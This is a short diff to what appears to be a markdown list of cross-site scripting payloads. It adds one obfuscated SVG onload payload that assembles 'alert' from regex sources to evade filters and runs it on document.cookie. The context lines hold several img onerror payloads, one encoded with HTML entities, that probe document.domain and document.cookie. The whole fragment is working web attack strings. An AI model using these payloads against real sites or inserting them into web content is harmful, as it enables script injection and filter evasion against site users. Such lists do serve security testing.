@@ -12,4 +12,6 @@
 ">]<img src=x onerror=alert(document.domain)> ">]<img src=x onerror=alert(document.cookie)>
 
 ">&#60;"><img src=x onerror=prompt(document.domain)> img src=x onerror=prompt(&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;)>
+
+<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
 ```
